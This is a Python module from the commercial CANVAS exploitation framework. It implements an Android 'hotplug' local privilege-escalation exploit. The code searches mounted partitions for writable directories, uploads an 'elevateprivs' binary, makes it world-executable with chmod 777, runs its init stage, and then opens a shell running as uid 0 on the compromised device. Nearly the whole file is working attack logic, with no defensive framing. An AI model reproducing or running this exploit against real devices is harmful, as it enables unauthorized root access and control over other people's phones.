#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

# Tested on: Android 2.1-update1 ARM EABI (motorola milestone)

import os
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *

from ExploitTypes.localexploit import LocalExploit
import canvasengine


NAME                           = "Android Hotplug"
DESCRIPTION                    = "Android hotplug privilege escalation."
DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """
"""
VERSION                        = "1.0"
DOCUMENTATION['VENDOR']        = "Google"
DOCUMENTATION["Repeatability"] = "Infinite (client side - no crash)"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Local"
PROPERTY['ARCH']               = [ ["Linux"] ]


class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.result                = ""
        self.name                  = NAME

        self.respath               = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.binname               = "elevateprivs"
        self.dstfilename           = "elevateprivs"
        self.dstdir                = None
        self.excluded_devices      = ["none", "sysfs", "devpts", "proc"]
        self.potential_directories = ["/data/data/com.android.browser", "/data/anr", "/tmp", "/temp", "/sdcard"]

    def parseMountLine(self, line):
        params = line.split(" ")

        if len(params) != 6:
            print "Ignoring line \"%s\"\n"%line
            return None

        device = params[0]
        directory = params[1]
        fstype = params[2]
        options = params[3].split(",")

        return (device, directory, fstype, options)

    def checkPartitions(self, mount_output):
        rw_partitions = []
        rw_nosuid_partitions = []
        rw_suid_partitions = []

        for line in mount_output.split("\n"):
            partition = self.parseMountLine(line)

            #If this line can't be parsed, just skip it
            if partition == None:
                continue

            (device, directory, fstype, options) = partition

            if device in self.excluded_devices:
                print "Device %s is excluded" % device
                continue

            if "rw" in options:
                print "Potential useful partition %s" % directory

                if "nosuid" in options:
                    print "   has nosuid bit set, damn! will need to try remount"
                    rw_nosuid_partitions.append(partition)
                else:
                    rw_suid_partitions.append(partition)

        rw_partitions = rw_suid_partitions + rw_nosuid_partitions

        if len(rw_partitions) != 0:
            print "Partitions suitable for use:"
            print rw_partitions
            return rw_partitions

        else:
            print "No suitable partitions were found"
            return None


    def checkPermissions(self, node, partitions):

        successful_dirs = []

        # Test pottential directories and mountpoint roots
        dirs = self.potential_directories
        for partition in partitions:
            device, directory, fstype, options = partition
            dirs.append(directory)

        print "Dirs to test: %s"%dirs

        for testdir in dirs:
            ret = node.shell.runcommand("echo test > %s/test.file" % testdir)
            if len (ret) == 0:
                self.log("[+] Got a writable DIR!: %s" % testdir)
                successful_dirs.append(testdir)
                node.shell.dounlink("%s/test.file" % testdir)
            else:
                self.log("[-] Directory %s is not writable: %s" % (testdir, ret))

        return successful_dirs


    def findSuitableDirectory(self, node):

        ret = node.runcommand("mount");
        partitions = self.checkPartitions(ret)

        if partitions == None:
            return None
        print "HERE"
        dirs = self.checkPermissions(node, partitions)

        if len(dirs) == 0:
            self.log("No suitable directories found, we failed.")
            return None
        print "HERE"


        useful_dirs = []
        useful_dirs_nosuid = []

        #Order the dirs we got based on wheter thir partition
        #is setuid or not
        for testdir in dirs:

            found = False;

            for partition in partitions:
                device, directory, fstype, options = partition
                if directory in testdir:
                    found = True
                    print "Directory %s is in partition %s" % (testdir, directory)
                    if "nosuid" in options:
                        print "has nosuid"
                        useful_dirs_nosuid.append((testdir, partition))
                    else:
                        print "does not has nosuid XD"
                        useful_dirs.append((testdir, partition))
                    break

            if not found:
                print "Partition for dir %s not matched, error?" % testdir

        return useful_dirs + useful_dirs_nosuid



    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        node = self.argsDict["passednodes"][0]

        for node in self.argsDict["passednodes"]:

            if "UnixShellNode" in node.nodetype:

                dstdirlist = self.findSuitableDirectory(node)

                if len(dstdirlist) == 0:
                    self.log("Didn't find a writable directory, aborting");
                    self.setInfo("%s - \"%s\" (failed)" % (NAME,"aaa"))
                    return 0;


                self.log("Writable dirs: %s"%dstdirlist)

                for dstdir, partition in dstdirlist:
                    self.log("uploading to %s, this may take a while..." % dstdir)
                    try:
                        node.upload(os.path.join(self.respath, self.binname), dstdir, self.dstfilename);
                        self.dstdir = dstdir
                        break
                    except:
                        self.log("Upload to %s failed, trying next dir to upload." % dstdir)

                if not self.dstdir:
                    self.log('Could not upload file, aborting..')
                    return 0


                self.log("Setting up permissions")
                out, rv = node.shell.shellcommand( "chmod 777 %s/%s" % (self.dstdir, self.dstfilename) , False)
                if rv != 0:
                    self.log("Error while changing permissions, aborting")
                    self.log("message: %s" % out)
                    #TODO cleanup
                    return 0


                self.log("executing elevateprivs step1...:")
                out, rv = node.shell.shellcommand("%s/%s init" % (self.dstdir, self.dstfilename), False);
                if rv != 0:
                    self.log("Error while executing elevateprivs, aborting")
                    self.log("message: %s" % out)
                    #TODO cleanup
                    return 0

                self.log("running shell with uid(0)")
                node.shell.runcommand("%s/%s root %s" % (self.dstdir, self.dstfilename, node.shell.prompt));


                #TODO verify runninc id command
                self.log("done")

            else:
                msg="UNSUPPORTED NODE TYPE %s"%(node)
                self.log(msg)
                self.setInfo("%s - \"%s\" (failed)" % (NAME,msg))
                return 0

            self.log("%s" % self.result)


        self.setInfo("%s - \"%s\" (finished)" % (NAME,"aaa"))
        return 1
